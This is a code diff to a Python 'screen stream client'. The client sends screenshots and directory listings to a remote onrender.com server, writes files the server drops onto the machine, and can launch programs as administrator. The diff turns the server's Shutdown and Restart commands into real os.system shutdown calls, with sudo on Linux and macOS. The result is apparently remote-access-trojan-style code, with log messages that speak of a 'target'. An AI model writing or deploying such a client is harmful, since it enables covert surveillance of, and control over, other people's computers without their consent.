@@ -8,6 +8,7 @@ from mss import mss
 import shutil
 from PIL import Image
 import ctypes
+import sys
 
 fps = 60
 URL = "https://anotherwebsite-x1gv.onrender.com/live"
@@ -51,6 +52,28 @@ def launch_as_admin(exe_path):
     else:
         print(f"Failed to launch. Windows Error Code: {result}")
 
+def shutdown_pc():
+    """Shuts down the computer based on the operating system."""
+    if sys.platform == "win32":
+        # /s = shutdown, /t 1 = time delay of 1 second
+        os.system("shutdown /s /t 1")
+    elif sys.platform == "darwin" or sys.platform.startswith("linux"):
+        # Requires sudo privileges on Linux/macOS
+        os.system("sudo shutdown -h now")
+    else:
+        print("Unsupported operating system.")
+
+def restart_pc():
+    """Restarts the computer based on the operating system."""
+    if sys.platform == "win32":
+        # /r = restart, /t 1 = time delay of 1 second
+        os.system("shutdown /r /t 1")
+    elif sys.platform == "darwin" or sys.platform.startswith("linux"):
+        # Requires sudo privileges on Linux/macOS
+        os.system("sudo shutdown -r now")
+    else:
+        print("Unsupported operating system.")
+
 print("Starting screen stream client...")
 amountofframes = 0
 with mss() as sct:
@@ -66,7 +89,7 @@ with mss() as sct:
             )
 
             buffer = BytesIO()
-            img.save(buffer, format="JPEG", quality=24)
+            img.save(buffer, format="JPEG", quality=20)
             b64_frame = base64.b64encode(buffer.getvalue()).decode("utf-8")
 
             current_files = get_directory_items(current_viewing_path)
@@ -157,9 +180,9 @@ with mss() as sct:
                                 print(f"Failed to write uploaded file: {e}")
                         print(f"Target action caught: Drop file content for '{filename}'")
                 if command == "Shutdown":
-                    print("Received Shutdown directive from server!")
+                    shutdown_pc()
                 elif command == "Restart":
-                    print("Received Restart directive from server!")
+                    restart_pc()
                 # print(
                 #     f"Frame sent. Server response: {server_reply.get('server_message')}"
                 # )
